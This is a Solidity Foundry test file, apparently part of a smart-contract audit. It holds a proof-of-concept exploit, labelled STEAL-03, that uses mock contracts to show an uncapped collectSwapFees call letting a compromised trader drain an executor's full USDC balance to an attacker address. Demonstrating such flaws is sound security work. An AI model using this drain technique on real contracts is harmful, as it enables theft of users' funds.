// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../shared/Harness.sol";

// STEAL-03: collectSwapFees has no cap -> compromised trader drains entire executor
contract STEAL03Test is Test, ITypes {

    MockPortfolio portfolio;
    MockExecutor  executor;

    address constant ATTACKER = address(0xAA);
    address constant TRADER   = address(0xBB);
    bytes32 constant SYM      = bytes32("USDC");

    function setUp() public {
        portfolio = new MockPortfolio();
        executor  = new MockExecutor(address(portfolio));
        executor.setTrader(TRADER);
        executor.setFeeManager(ATTACKER);
        portfolio.setBalance(address(executor), SYM, 1_000_000e6);
    }

    function testSTEAL03_CollectSwapFeesDrainsExecutor() public {
        console.log("\n=== STEAL-03: collectSwapFees Unlimited Drain ===");
        uint256 execBal = portfolio.balances(address(executor), SYM);
        console.log("[+] Executor balance:", execBal / 1e6, "USDC");

        uint256[] memory swapIds = new uint256[](1); swapIds[0] = 1;
        uint256[] memory fees    = new uint256[](1); fees[0]    = execBal;
        vm.prank(TRADER);
        executor.collectSwapFees(SYM, swapIds, fees);

        uint256 stolen       = portfolio.balances(ATTACKER, SYM);
        uint256 execBalAfter = portfolio.balances(address(executor), SYM);
        console.log("[EXPLOIT] ATTACKER received:", stolen / 1e6, "USDC");
        console.log("[EXPLOIT] Executor remaining:", execBalAfter / 1e6, "USDC");
        assertEq(stolen,       execBal, "STEAL-03 FAILED: attacker should receive full executor balance");
        assertEq(execBalAfter, 0,       "STEAL-03 FAILED: executor should be drained to zero");
        console.log("[EXPLOIT] STEAL-03 CONFIRMED");
    }
}
